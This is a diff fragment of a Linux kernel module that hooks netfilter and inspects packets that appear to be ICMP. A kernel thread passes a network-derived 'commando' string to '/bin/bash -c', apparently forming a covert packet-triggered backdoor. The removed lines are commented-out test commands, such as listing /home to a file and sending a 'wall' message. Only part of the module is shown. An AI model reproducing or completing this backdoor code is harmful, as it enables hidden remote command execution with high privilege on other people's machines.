@@ -18,7 +18,6 @@ static struct nf_hook_ops nfho;     // net filter hook option struct
 struct sk_buff* sock_buff;          // socket buffer used in linux kernel
 struct udphdr* udp_header;          // udp header struct (not used)
 struct iphdr* ip_header;            // ip header struct
-//struct ethhdr* ether;          // mac header struct
 struct icmphdr* icmp_header;
 struct net* n;			    // net struct
 static struct task_struct *etx_thread;
@@ -35,12 +34,10 @@ MODULE_LICENSE("GPL");
 
 
 
-//char * argv[] = {"/bin/sh", "-c", "/bin/ls /home > <path-to-file>", NULL};
-//char * argv[] = {"/bin/sh", "-c", "wall -n Hi", NULL};
+
 
 char * envp[] = { "HOME=/","PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
-//char * argv[] = { "/bin/touch", "/home/ben/Desktop/neverland", NULL };
-//char * argv[] = { "/bin/bash", "-c", "echo hi", NULL };
+
 
 
 char commando[50];
@@ -54,7 +51,6 @@ int thread_function(void *pv)
         down_interruptible(&can_execute);
         msleep(10);
         if (queue == 1) {  
-            //char * argv[] = { commando, "/home/ben/Desktop/neverland", NULL };  728
             char * argv[] = { "/bin/bash", "-c", commando, NULL }; 
             queue = 0;
             printk("when commando lands: %s\n", commando);
@@ -106,8 +102,6 @@ void pkt_hex_dump(struct sk_buff *skb, int icmp_packet_len)
 
         printk(KERN_CONT "\n");
     
-    
-    //char * ptr = &command[0];
     printk("command length: %lu\n", sizeof(command));
     printk("icmp_packet_len: %i\n", icmp_packet_len);
     //printk("argv0 is: %s\n", argv[0]);
